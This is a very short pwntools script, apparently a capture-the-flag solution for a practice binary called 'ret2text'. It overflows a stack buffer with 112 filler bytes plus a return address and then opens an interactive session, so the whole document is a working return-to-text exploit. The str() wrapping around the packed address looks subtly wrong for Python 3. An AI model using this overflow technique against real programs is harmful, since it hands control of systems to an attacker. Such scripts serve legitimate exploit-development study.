from pwn import *

target = 0x0804863a

sh = process("./ret2text")

sh.sendline('A'*112+str(p32(target)))
sh.interactive()
